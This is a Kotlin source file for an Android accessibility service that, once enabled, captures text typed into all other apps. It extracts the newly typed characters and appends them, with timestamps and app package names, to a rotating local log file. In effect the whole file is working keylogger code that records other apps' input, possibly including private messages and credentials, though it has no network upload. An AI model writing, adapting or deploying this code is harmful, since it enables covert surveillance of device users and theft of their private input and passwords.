package com.moonless.textlogger

import android.accessibilityservice.AccessibilityService
import android.content.SharedPreferences
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class TextLoggerService : AccessibilityService() {

    companion object {
        const val PREFS = "textlogger_prefs"
        const val KEY_ENABLED = "enabled"
        const val LOG_FILE = "textlog.txt"

        @Volatile
        var isRunning = false
            private set
    }

    private lateinit var prefs: SharedPreferences
    private lateinit var logFile: File
    private var lastText = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        prefs = getSharedPreferences(PREFS, MODE_PRIVATE)
        logFile = File(filesDir, LOG_FILE)
        isRunning = true
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (!prefs.getBoolean(KEY_ENABLED, false)) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val pkg = event.packageName?.toString() ?: return
            if (pkg == packageName) return // Nu ne loga pe noi înșine

            val currentText = extractText(event) ?: return
            if (currentText.isEmpty() || currentText == lastText) return

            val delta = diffText(lastText, currentText)
            lastText = currentText

            if (delta.isNotEmpty()) {
                appendToLog(pkg, delta)
            }
        } else if (event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED || 
                   event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            lastText = "" // Resetăm când schimbăm câmpul sau aplicația
        }
    }

    private fun extractText(event: AccessibilityEvent): String? {
        val source = event.source
        if (source != null) {
            try {
                val text = source.text?.toString()
                if (!text.isNullOrEmpty()) return text
            } finally {
                source.recycle()
            }
        }
        val eventText = event.text
        if (eventText.isNotEmpty()) return eventText.joinToString("")
        return null
    }

    private fun diffText(old: String, new: String): String {
        if (old.isEmpty()) return new
        if (new.startsWith(old)) return new.substring(old.length) // S-a adăugat text
        if (old.startsWith(new)) return "" // S-a șters text (backspace)
        return new // S-a dat paste sau s-a schimbat tot
    }

    private fun appendToLog(pkg: String, text: String) {
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val line = "[$timestamp] [$pkg] $text\n"
            
            // Dacă fișierul e prea mare (peste 2MB), îl salvăm ca backup și începem unul nou
            if (logFile.exists() && logFile.length() > 2 * 1024 * 1024) {
                val backup = File(filesDir, "textlog_old_${System.currentTimeMillis()}.txt")
                logFile.renameTo(backup)
            }
            
            logFile.appendText(line, Charsets.UTF_8)
        } catch (_: Exception) { }
    }

    override fun onInterrupt() { isRunning = false }
    override fun onDestroy() { isRunning = false; super.onDestroy() }
}